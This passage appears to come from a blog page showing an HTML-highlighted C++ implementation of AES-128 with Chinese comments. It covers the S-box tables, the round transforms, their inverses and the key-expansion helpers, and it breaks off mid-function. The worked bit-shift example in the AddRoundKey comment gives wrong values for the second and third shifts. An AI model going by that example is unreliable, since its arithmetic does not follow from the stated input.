class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>&#125;,</span><br><span class="line">&#123;<span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>, <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span>&#125;</span><br><span class="line">&#125;<span class="comment">;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">byte</span> Inv_S_Box[<span class="number">16</span>][<span class="number">16</span>] = &#123;</span><br><span class="line">&#123;<span class="number">0x52</span>, <span class="number">0x09</span>, <span class="number">0x6A</span>, <span class="number">0xD5</span>, <span class="number">0x30</span>, <span class="number">0x36</span>, <span class="number">0xA5</span>, <span class="number">0x38</span>, <span class="number">0xBF</span>, <span class="number">0x40</span>, <span class="number">0xA3</span>, <span class="number">0x9E</span>, <span class="number">0x81</span>, <span class="number">0xF3</span>, <span class="number">0xD7</span>, <span class="number">0xFB</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x7C</span>, <span class="number">0xE3</span>, <span class="number">0x39</span>, <span class="number">0x82</span>, <span class="number">0x9B</span>, <span class="number">0x2F</span>, <span class="number">0xFF</span>, <span class="number">0x87</span>, <span class="number">0x34</span>, <span class="number">0x8E</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0xC4</span>, <span class="number">0xDE</span>, <span class="number">0xE9</span>, <span class="number">0xCB</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x54</span>, <span class="number">0x7B</span>, <span class="number">0x94</span>, <span class="number">0x32</span>, <span class="number">0xA6</span>, <span class="number">0xC2</span>, <span class="number">0x23</span>, <span class="number">0x3D</span>, <span class="number">0xEE</span>, <span class="number">0x4C</span>, <span class="number">0x95</span>, <span class="number">0x0B</span>, <span class="number">0x42</span>, <span class="number">0xFA</span>, <span class="number">0xC3</span>, <span class="number">0x4E</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x08</span>, <span class="number">0x2E</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x28</span>, <span class="number">0xD9</span>, <span class="number">0x24</span>, <span class="number">0xB2</span>, <span class="number">0x76</span>, <span class="number">0x5B</span>, <span class="number">0xA2</span>, <span class="number">0x49</span>, <span class="number">0x6D</span>, <span class="number">0x8B</span>, <span class="number">0xD1</span>, <span class="number">0x25</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x72</span>, <span class="number">0xF8</span>, <span class="number">0xF6</span>, <span class="number">0x64</span>, <span class="number">0x86</span>, <span class="number">0x68</span>, <span class="number">0x98</span>, <span class="number">0x16</span>, <span class="number">0xD4</span>, <span class="number">0xA4</span>, <span class="number">0x5C</span>, <span class="number">0xCC</span>, <span class="number">0x5D</span>, <span class="number">0x65</span>, <span class="number">0xB6</span>, <span class="number">0x92</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x6C</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x50</span>, <span class="number">0xFD</span>, <span class="number">0xED</span>, <span class="number">0xB9</span>, <span class="number">0xDA</span>, <span class="number">0x5E</span>, <span class="number">0x15</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0xA7</span>, <span class="number">0x8D</span>, <span class="number">0x9D</span>, <span class="number">0x84</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x90</span>, <span class="number">0xD8</span>, <span class="number">0xAB</span>, <span class="number">0x00</span>, <span class="number">0x8C</span>, <span class="number">0xBC</span>, <span class="number">0xD3</span>, <span class="number">0x0A</span>, <span class="number">0xF7</span>, <span class="number">0xE4</span>, <span class="number">0x58</span>, <span class="number">0x05</span>, <span class="number">0xB8</span>, <span class="number">0xB3</span>, <span class="number">0x45</span>, <span class="number">0x06</span>&#125;,</span><br><span class="line">&#123;<span class="number">0xD0</span>, <span class="number">0x2C</span>, <span class="number">0x1E</span>, <span class="number">0x8F</span>, <span class="number">0xCA</span>, <span class="number">0x3F</span>, <span class="number">0x0F</span>, <span class="number">0x02</span>, <span class="number">0xC1</span>, <span class="number">0xAF</span>, <span class="number">0xBD</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x8A</span>, <span class="number">0x6B</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x3A</span>, <span class="number">0x91</span>, <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0x4F</span>, <span class="number">0x67</span>, <span class="number">0xDC</span>, <span class="number">0xEA</span>, <span class="number">0x97</span>, <span class="number">0xF2</span>, <span class="number">0xCF</span>, <span class="number">0xCE</span>, <span class="number">0xF0</span>, <span class="number">0xB4</span>, <span class="number">0xE6</span>, <span class="number">0x73</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x96</span>, <span class="number">0xAC</span>, <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0xE7</span>, <span class="number">0xAD</span>, <span class="number">0x35</span>, <span class="number">0x85</span>, <span class="number">0xE2</span>, <span class="number">0xF9</span>, <span class="number">0x37</span>, <span class="number">0xE8</span>, <span class="number">0x1C</span>, <span class="number">0x75</span>, <span class="number">0xDF</span>, <span class="number">0x6E</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x47</span>, <span class="number">0xF1</span>, <span class="number">0x1A</span>, <span class="number">0x71</span>, <span class="number">0x1D</span>, <span class="number">0x29</span>, <span class="number">0xC5</span>, <span class="number">0x89</span>, <span class="number">0x6F</span>, <span class="number">0xB7</span>, <span class="number">0x62</span>, <span class="number">0x0E</span>, <span class="number">0xAA</span>, <span class="number">0x18</span>, <span class="number">0xBE</span>, <span class="number">0x1B</span>&#125;,</span><br><span class="line">&#123;<span class="number">0xFC</span>, <span class="number">0x56</span>, <span class="number">0x3E</span>, <span class="number">0x4B</span>, <span class="number">0xC6</span>, <span class="number">0xD2</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x9A</span>, <span class="number">0xDB</span>, <span class="number">0xC0</span>, <span class="number">0xFE</span>, <span class="number">0x78</span>, <span class="number">0xCD</span>, <span class="number">0x5A</span>, <span class="number">0xF4</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x1F</span>, <span class="number">0xDD</span>, <span class="number">0xA8</span>, <span class="number">0x33</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0xC7</span>, <span class="number">0x31</span>, <span class="number">0xB1</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x27</span>, <span class="number">0x80</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x7F</span>, <span class="number">0xA9</span>, <span class="number">0x19</span>, <span class="number">0xB5</span>, <span class="number">0x4A</span>, <span class="number">0x0D</span>, <span class="number">0x2D</span>, <span class="number">0xE5</span>, <span class="number">0x7A</span>, <span class="number">0x9F</span>, <span class="number">0x93</span>, <span class="number">0xC9</span>, <span class="number">0x9C</span>, <span class="number">0xEF</span>&#125;,</span><br><span class="line">&#123;<span class="number">0xA0</span>, <span class="number">0xE0</span>, <span class="number">0x3B</span>, <span class="number">0x4D</span>, <span class="number">0xAE</span>, <span class="number">0x2A</span>, <span class="number">0xF5</span>, <span class="number">0xB0</span>, <span class="number">0xC8</span>, <span class="number">0xEB</span>, <span class="number">0xBB</span>, <span class="number">0x3C</span>, <span class="number">0x83</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x61</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x17</span>, <span class="number">0x2B</span>, <span class="number">0x04</span>, <span class="number">0x7E</span>, <span class="number">0xBA</span>, <span class="number">0x77</span>, <span class="number">0xD6</span>, <span class="number">0x26</span>, <span class="number">0xE1</span>, <span class="number">0x69</span>, <span class="number">0x14</span>, <span class="number">0x63</span>, <span class="number">0x55</span>, <span class="number">0x21</span>, <span class="number">0x0C</span>, <span class="number">0x7D</span>&#125;</span><br><span class="line">&#125;<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">// 轮常数，密钥扩展中用到。（AES-<span class="number">128</span>只需要<span class="number">10</span>轮）</span><br><span class="line"><span class="built_in">word</span> Rcon[<span class="number">10</span>] = &#123;<span class="number">0x01000000</span>, <span class="number">0x02000000</span>, <span class="number">0x04000000</span>, <span class="number">0x08000000</span>, <span class="number">0x10000000</span>,</span><br><span class="line"> <span class="number">0x20000000</span>, <span class="number">0x40000000</span>, <span class="number">0x80000000</span>, <span class="number">0x1b000000</span>, <span class="number">0x36000000</span>&#125;<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">/**********************************************************************/</span><br><span class="line">/*                                                                    */</span><br><span class="line">/*                              AES算法实现                           */</span><br><span class="line">/*                                                                    */</span><br><span class="line">/**********************************************************************/</span><br><span class="line"></span><br><span class="line">/******************************下面是加密的变换函数**********************/</span><br><span class="line">/**</span><br><span class="line"> *  S盒变换 - SubBytes()接受一个 4x4 的字节矩阵作为输入，</span><br><span class="line"> *  对其中的每个字节，前四位组成十六进制数x作为行号，后四位组成的十六进制数 y 作为列号，</span><br><span class="line"> *  查找表中对应的值替换原来位置上的字节。</span><br><span class="line"> */</span><br><span class="line"> // mtx 是一个包含 <span class="number">16</span> 个 <span class="built_in">byte</span> 元素的一维数组，每个 <span class="built_in">byte</span> 是一个 bitset，它有 <span class="number">8</span> 个位。</span><br><span class="line"> //因此，通过使用 mtx[i][j] 的方式，您可以访问 <span class="built_in">byte</span> 中的单个位</span><br><span class="line">void SubBytes(<span class="built_in">byte</span> mtx[<span class="number">4</span>*<span class="number">4</span>])</span><br><span class="line">&#123;</span><br><span class="line">for(<span class="keyword">int</span> i=<span class="number">0</span><span class="comment">; i&lt;16; ++i)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> row = mtx[i][<span class="number">7</span>]*<span class="number">8</span> + mtx[i][<span class="number">6</span>]*<span class="number">4</span> + mtx[i][<span class="number">5</span>]*<span class="number">2</span> + mtx[i][<span class="number">4</span>]<span class="comment">;</span></span><br><span class="line"><span class="keyword">int</span> col = mtx[i][<span class="number">3</span>]*<span class="number">8</span> + mtx[i][<span class="number">2</span>]*<span class="number">4</span> + mtx[i][<span class="number">1</span>]*<span class="number">2</span> + mtx[i][<span class="number">0</span>]<span class="comment">;</span></span><br><span class="line">mtx[i] = S_Box[row][col]<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *  行变换 - 按字节循环移位</span><br><span class="line"> */</span><br><span class="line">void ShiftRows(<span class="built_in">byte</span> mtx[<span class="number">4</span>*<span class="number">4</span>])</span><br><span class="line">&#123;</span><br><span class="line">// 第二行循环左移一位</span><br><span class="line"><span class="built_in">byte</span> temp = mtx[<span class="number">4</span>]<span class="comment">;</span></span><br><span class="line">for(<span class="keyword">int</span> i=<span class="number">0</span><span class="comment">; i&lt;3; ++i)</span></span><br><span class="line">mtx[i+<span class="number">4</span>] = mtx[i+<span class="number">5</span>]<span class="comment">;</span></span><br><span class="line">mtx[<span class="number">7</span>] = temp<span class="comment">;</span></span><br><span class="line">// 第三行循环左移两位</span><br><span class="line">for(<span class="keyword">int</span> i=<span class="number">0</span><span class="comment">; i&lt;2; ++i)</span></span><br><span class="line">&#123;</span><br><span class="line">temp = mtx[i+<span class="number">8</span>]<span class="comment">;</span></span><br><span class="line">mtx[i+<span class="number">8</span>] = mtx[i+<span class="number">10</span>]<span class="comment">;</span></span><br><span class="line">mtx[i+<span class="number">10</span>] = temp<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">// 第四行循环左移三位</span><br><span class="line">temp = mtx[<span class="number">15</span>]<span class="comment">;</span></span><br><span class="line">for(<span class="keyword">int</span> i=<span class="number">3</span><span class="comment">; i&gt;0; --i)</span></span><br><span class="line">mtx[i+<span class="number">12</span>] = mtx[i+<span class="number">11</span>]<span class="comment">;</span></span><br><span class="line">mtx[<span class="number">12</span>] = temp<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *  有限域上的乘法 GF(<span class="number">2</span>^<span class="number">8</span>)</span><br><span class="line"> */</span><br><span class="line"><span class="built_in">byte</span> GFMul(<span class="built_in">byte</span> a, <span class="built_in">byte</span> b) &#123;</span><br><span class="line"><span class="built_in">byte</span> p = <span class="number">0</span><span class="comment">;</span></span><br><span class="line"><span class="built_in">byte</span> hi_bit_set<span class="comment">;</span></span><br><span class="line">for (<span class="keyword">int</span> counter = <span class="number">0</span><span class="comment">; counter &lt; 8; counter++) &#123;</span></span><br><span class="line">if ((b &amp; <span class="built_in">byte</span>(<span class="number">1</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">p ^= a<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">hi_bit_set = (<span class="built_in">byte</span>) (a &amp; <span class="built_in">byte</span>(<span class="number">0x80</span>))<span class="comment">;</span></span><br><span class="line">a &lt;&lt;= <span class="number">1</span><span class="comment">;</span></span><br><span class="line">if (hi_bit_set != <span class="number">0</span>) &#123;</span><br><span class="line">a ^= <span class="number">0x1b</span><span class="comment">; /* x^8 + x^4 + x^3 + x + 1 */</span></span><br><span class="line">&#125;</span><br><span class="line">b &gt;&gt;= <span class="number">1</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">return p<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *  列混合，用上面说过的公式</span><br><span class="line"> */</span><br><span class="line">void MixColumns(<span class="built_in">byte</span> mtx[<span class="number">4</span>*<span class="number">4</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">byte</span> arr[<span class="number">4</span>]<span class="comment">; // 作为未位移的矩阵</span></span><br><span class="line">for(<span class="keyword">int</span> i=<span class="number">0</span><span class="comment">; i&lt;4; ++i)</span></span><br><span class="line">&#123;</span><br><span class="line">for(<span class="keyword">int</span> j=<span class="number">0</span><span class="comment">; j&lt;4; ++j)</span></span><br><span class="line">arr[j] = mtx[i+j*<span class="number">4</span>]<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">mtx[i] = GFMul(<span class="number">0x02</span>, arr[<span class="number">0</span>]) ^ GFMul(<span class="number">0x03</span>, arr[<span class="number">1</span>]) ^ arr[<span class="number">2</span>] ^ arr[<span class="number">3</span>]<span class="comment">;</span></span><br><span class="line">mtx[i+<span class="number">4</span>] = arr[<span class="number">0</span>] ^ GFMul(<span class="number">0x02</span>, arr[<span class="number">1</span>]) ^ GFMul(<span class="number">0x03</span>, arr[<span class="number">2</span>]) ^ arr[<span class="number">3</span>]<span class="comment">;</span></span><br><span class="line">mtx[i+<span class="number">8</span>] = arr[<span class="number">0</span>] ^ arr[<span class="number">1</span>] ^ GFMul(<span class="number">0x02</span>, arr[<span class="number">2</span>]) ^ GFMul(<span class="number">0x03</span>, arr[<span class="number">3</span>])<span class="comment">;</span></span><br><span class="line">mtx[i+<span class="number">12</span>] = GFMul(<span class="number">0x03</span>, arr[<span class="number">0</span>]) ^ arr[<span class="number">1</span>] ^ arr[<span class="number">2</span>] ^ GFMul(<span class="number">0x02</span>, arr[<span class="number">3</span>])<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *  轮密钥加变换 - 将每一列与扩展密钥进行异或</span><br><span class="line"> *  注意<span class="built_in">word</span>和<span class="built_in">byte</span>左移和右移是同普通的没有限制长度的二进制的左移和右移的区别</span><br><span class="line"> */</span><br><span class="line"> /**</span><br><span class="line"> *  实例</span><br><span class="line"> *  假设 k[i] 的二进制表示如下： k[i] = <span class="number">11011010101100110011011001101100</span></span><br><span class="line"></span><br><span class="line"> *  <span class="built_in">k1</span> = k[i] &gt;&gt; <span class="number">24</span>：这将 k[i] 右移<span class="number">24</span>位，保留最高的<span class="number">8</span>位。</span><br><span class="line"></span><br><span class="line"> *  原始 k[i]： <span class="number">11011010101100110011011001101100</span></span><br><span class="line"> *  k[i] 右移<span class="number">24</span>位： <span class="number">0000000011011010</span></span><br><span class="line"> *  <span class="built_in">k2</span> = (k[i] &lt;&lt; <span class="number">8</span>) &gt;&gt; <span class="number">24</span>：这将 k[i] 左移<span class="number">8</span>位（在之前的基础上左移），然后再右移<span class="number">24</span>位，以保留接下来的<span class="number">8</span>位。</span><br><span class="line"></span><br><span class="line"> *  原始 k[i]： <span class="number">11011010101100110011011001101100</span></span><br><span class="line"> *  k[i] 左移<span class="number">8</span>位： <span class="number">10110011011011001101100000000000</span></span><br><span class="line"> *  k[i] 左移<span class="number">8</span>位后右移<span class="number">24</span>位： <span class="number">0000000010110011</span></span><br><span class="line"> *  <span class="built_in">k3</span> = (k[i] &lt;&lt; <span class="number">16</span>) &gt;&gt; <span class="number">24</span>：这将 k[i] 左移<span class="number">16</span>位，然后再右移<span class="number">24</span>位，以保留接下来的<span class="number">8</span>位。</span><br><span class="line"></span><br><span class="line"> *  原始 k[i]： <span class="number">11011010101100110011011001101100</span></span><br><span class="line"> *  k[i] 左移<span class="number">16</span>位： <span class="number">01100110011011000000000000000000</span></span><br><span class="line"> *  k[i] 左移<span class="number">16</span>位后右移<span class="number">24</span>位： <span class="number">0000000001100110</span></span><br><span class="line"> *  <span class="built_in">k4</span> = (k[i] &lt;&lt; <span class="number">24</span>) &gt;&gt; <span class="number">24</span>：这将 k[i] 左移<span class="number">24</span>位，然后再右移<span class="number">24</span>位，以保留最低的<span class="number">8</span>位。</span><br><span class="line"></span><br><span class="line"> *  原始 k[i]： <span class="number">11011010101100110011011001101100</span></span><br><span class="line"> *  k[i] 左移<span class="number">24</span>位： <span class="number">00110011011011000000000000000000</span></span><br><span class="line"> *  k[i] 左移<span class="number">24</span>位后右移<span class="number">24</span>位： <span class="number">0000000000110011</span></span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">void AddRoundKey(<span class="built_in">byte</span> mtx[<span class="number">4</span>*<span class="number">4</span>], <span class="built_in">word</span> k[<span class="number">4</span>])</span><br><span class="line">&#123;</span><br><span class="line">for(<span class="keyword">int</span> i=<span class="number">0</span><span class="comment">; i&lt;4; ++i)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">word</span> <span class="built_in">k1</span> = k[i] &gt;&gt; <span class="number">24</span><span class="comment">; // 最高的8位</span></span><br><span class="line"><span class="built_in">word</span> <span class="built_in">k2</span> = (k[i] &lt;&lt; <span class="number">8</span>) &gt;&gt; <span class="number">24</span><span class="comment">;</span></span><br><span class="line"><span class="built_in">word</span> <span class="built_in">k3</span> = (k[i] &lt;&lt; <span class="number">16</span>) &gt;&gt; <span class="number">24</span><span class="comment">;</span></span><br><span class="line"><span class="built_in">word</span> <span class="built_in">k4</span> = (k[i] &lt;&lt; <span class="number">24</span>) &gt;&gt; <span class="number">24</span><span class="comment">;</span></span><br><span class="line"></span><br><span class="line">mtx[i] = mtx[i] ^ <span class="built_in">byte</span>(<span class="built_in">k1</span><span class="number">.</span>to_ulong())<span class="comment">;</span></span><br><span class="line">mtx[i+<span class="number">4</span>] = mtx[i+<span class="number">4</span>] ^ <span class="built_in">byte</span>(<span class="built_in">k2</span><span class="number">.</span>to_ulong())<span class="comment">;</span></span><br><span class="line">mtx[i+<span class="number">8</span>] = mtx[i+<span class="number">8</span>] ^ <span class="built_in">byte</span>(<span class="built_in">k3</span><span class="number">.</span>to_ulong())<span class="comment">;</span></span><br><span class="line">mtx[i+<span class="number">12</span>] = mtx[i+<span class="number">12</span>] ^ <span class="built_in">byte</span>(<span class="built_in">k4</span><span class="number">.</span>to_ulong())<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**************************下面是解密的逆变换函数***********************/</span><br><span class="line">/**</span><br><span class="line"> *  逆S盒变换</span><br><span class="line"> */</span><br><span class="line">void InvSubBytes(<span class="built_in">byte</span> mtx[<span class="number">4</span>*<span class="number">4</span>])</span><br><span class="line">&#123;</span><br><span class="line">for(<span class="keyword">int</span> i=<span class="number">0</span><span class="comment">; i&lt;16; ++i)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> row = mtx[i][<span class="number">7</span>]*<span class="number">8</span> + mtx[i][<span class="number">6</span>]*<span class="number">4</span> + mtx[i][<span class="number">5</span>]*<span class="number">2</span> + mtx[i][<span class="number">4</span>]<span class="comment">;</span></span><br><span class="line"><span class="keyword">int</span> col = mtx[i][<span class="number">3</span>]*<span class="number">8</span> + mtx[i][<span class="number">2</span>]*<span class="number">4</span> + mtx[i][<span class="number">1</span>]*<span class="number">2</span> + mtx[i][<span class="number">0</span>]<span class="comment">;</span></span><br><span class="line">mtx[i] = Inv_S_Box[row][col]<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *  逆行变换 - 以字节为单位循环右移</span><br><span class="line"> */</span><br><span class="line">void InvShiftRows(<span class="built_in">byte</span> mtx[<span class="number">4</span>*<span class="number">4</span>])</span><br><span class="line">&#123;</span><br><span class="line">// 第二行循环右移一位</span><br><span class="line"><span class="built_in">byte</span> temp = mtx[<span class="number">7</span>]<span class="comment">;</span></span><br><span class="line">for(<span class="keyword">int</span> i=<span class="number">3</span><span class="comment">; i&gt;0; --i)</span></span><br><span class="line">mtx[i+<span class="number">4</span>] = mtx[i+<span class="number">3</span>]<span class="comment">;</span></span><br><span class="line">mtx[<span class="number">4</span>] = temp<span class="comment">;</span></span><br><span class="line">// 第三行循环右移两位</span><br><span class="line">for(<span class="keyword">int</span> i=<span class="number">0</span><span class="comment">; i&lt;2; ++i)</span></span><br><span class="line">&#123;</span><br><span class="line">temp = mtx[i+<span class="number">8</span>]<span class="comment">;</span></span><br><span class="line">mtx[i+<span class="number">8</span>] = mtx[i+<span class="number">10</span>]<span class="comment">;</span></span><br><span class="line">mtx[i+<span class="number">10</span>] = temp<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">// 第四行循环右移三位</span><br><span class="line">temp = mtx[<span class="number">12</span>]<span class="comment">;</span></span><br><span class="line">for(<span class="keyword">int</span> i=<span class="number">0</span><span class="comment">; i&lt;3; ++i)</span></span><br><span class="line">mtx[i+<span class="number">12</span>] = mtx[i+<span class="number">13</span>]<span class="comment">;</span></span><br><span class="line">mtx[<span class="number">15</span>] = temp<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void InvMixColumns(<span class="built_in">byte</span> mtx[<span class="number">4</span>*<span class="number">4</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">byte</span> arr[<span class="number">4</span>]<span class="comment">;</span></span><br><span class="line">for(<span class="keyword">int</span> i=<span class="number">0</span><span class="comment">; i&lt;4; ++i)</span></span><br><span class="line">&#123;</span><br><span class="line">for(<span class="keyword">int</span> j=<span class="number">0</span><span class="comment">; j&lt;4; ++j)</span></span><br><span class="line">arr[j] = mtx[i+j*<span class="number">4</span>]<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">mtx[i] = GFMul(<span class="number">0x0e</span>, arr[<span class="number">0</span>]) ^ GFMul(<span class="number">0x0b</span>, arr[<span class="number">1</span>]) ^ GFMul(<span class="number">0x0d</span>, arr[<span class="number">2</span>]) ^ GFMul(<span class="number">0x09</span>, arr[<span class="number">3</span>])<span class="comment">;</span></span><br><span class="line">mtx[i+<span class="number">4</span>] = GFMul(<span class="number">0x09</span>, arr[<span class="number">0</span>]) ^ GFMul(<span class="number">0x0e</span>, arr[<span class="number">1</span>]) ^ GFMul(<span class="number">0x0b</span>, arr[<span class="number">2</span>]) ^ GFMul(<span class="number">0x0d</span>, arr[<span class="number">3</span>])<span class="comment">;</span></span><br><span class="line">mtx[i+<span class="number">8</span>] = GFMul(<span class="number">0x0d</span>, arr[<span class="number">0</span>]) ^ GFMul(<span class="number">0x09</span>, arr[<span class="number">1</span>]) ^ GFMul(<span class="number">0x0e</span>, arr[<span class="number">2</span>]) ^ GFMul(<span class="number">0x0b</span>, arr[<span class="number">3</span>])<span class="comment">;</span></span><br><span class="line">mtx[i+<span class="number">12</span>] = GFMul(<span class="number">0x0b</span>, arr[<span class="number">0</span>]) ^ GFMul(<span class="number">0x0d</span>, arr[<span class="number">1</span>]) ^ GFMul(<span class="number">0x09</span>, arr[<span class="number">2</span>]) ^ GFMul(<span class="number">0x0e</span>, arr[<span class="number">3</span>])<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/******************************下面是密钥扩展部分***********************/</span><br><span class="line">/**</span><br><span class="line"> * 将<span class="number">4</span>个 <span class="built_in">byte</span> 转换为一个 <span class="built_in">word</span>.</span><br><span class="line"> */</span><br><span class="line"><span class="built_in">word</span> <span class="built_in">Word</span>(<span class="built_in">byte</span>&amp; <span class="built_in">k1</span>, <span class="built_in">byte</span>&amp; <span class="built_in">k2</span>, <span class="built_in">byte</span>&amp; <span class="built_in">k3</span>, <span class="built_in">byte</span>&amp; <span class="built_in">k4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">word</span> result(<span class="number">0x00000000</span>)<span class="comment">;</span></span><br><span class="line"><span class="built_in">word</span> temp<span class="comment">;</span></span><br><span class="line">temp = <span class="built_in">k1</span><span class="number">.</span>to_ulong()<span class="comment">;  // K1</span></span><br><span class="line">temp &lt;&lt;= <span class="number">24</span><span class="comment">;</span></span><br><span class="line">result |= temp<span class="comment">;</span></span><br><span class="line">temp = <span class="built_in">k2</span><span class="number">.</span>to_ulong()<span class="comment">;  // K2</span></span><br><span class="line">temp &lt;&lt;= <span class="number">16</span><span class="comment">;</span></span><br><span class="line">result |= temp<span class="comment">;</span></span><br><span class="line">temp = <span class="built_in">k3</span><span class="number">.</span>to_ulong()<span class="comment">;  // K3</span></span><br><span class="line">temp &lt;&lt;= <span class="number">8</span><span class="comment">;</span></span><br><span class="line">result |= temp<span class="comment">;</span></span><br><span class="line">temp = <span class="built_in">k4</span><span class="number">.</span>to_ulong()<span class="comment">;  // K4</span></span><br><span class="line">result |= temp<span class="comment">;</span></span><br><span class="line">return result<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *  按字节 循环左移一位</span><br><span class="line"> *  即把[a0, a1, a2, a3]变成[a1, a2, a3, a0]</span><br><span class="line"> */</span><br><span class="line"><span class="built_in">word</span> RotWord(const <span class="built_in">word</span>&amp; rw)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">word</span> high = rw &lt;&lt; <span class="number">8</span><span class="comment">;</span></span><br><span class="line"><span class="built_in">word</span> low = rw &gt;&gt; <span class="number">24</span><span class="comment">;</span></span><br><span class="line">return high | low<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *  对输入<span class="built_in">word</span>中的每一个字节进行S-盒变换</span><br><span class="line"> */</span><br><span class="line"><span class="built_in">word</span> SubWord(const <span class="built_in">word</span>&amp; sw)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">word</span> temp<span class="comment">;</span></span><br><span class="line">for(<span class="keyword">int</span> i=<span class="number">0</span><span class="comment">; i&lt;32; i+=8)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> row = sw[i+<span class="number">7</span>]*<span class="number">8</span> + sw[i+<span class="number">6</span>]*<span class="number">4</span> + sw[i+<span class="number">5</span>]*<span class="number">2</span> + sw[i+<span class="number">4</span>]<span class="comment">;</span></span><br><span class="line"><span class="keyword">int</span> col = sw[i+<span class="number">3</span>]*<span class="number">8</span> + sw[i+<span class="number">2</span>]*<span class="number">4</span> + sw[i+<span class="number">1</span>]*<span class="number">2</span> + sw[i]<span class="comment">;</span></span><br><span class="line"><span class="built_in">byte</span> val = S_Box[row][col]<span class="comment">;</span></span><br><span class="line">for(<span class="keyword">int</span> j=<span class="number">0</span><span class="comment">; j&lt;8; ++j)</span></span><br><span class="line">temp[i+j] = val[j]<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">return temp<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *  密钥扩展函数 - 对<span class="number">128</span>位密钥进行扩展得到 w[<span class="number">4</span>*(Nr+<span class="number">1</span>)]</span><br><span class="line"> */</span><br><span class="line">void KeyExpansion(<span class="built_in">byte</span> key[<span class="number">4</span>*Nk], <span class="built_in">word</span> w[<span class="number">4</span>*(Nr+<span class="number">1</span>)])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">word</span> temp<span class="comment">;</span></span><br><span class="line"><span 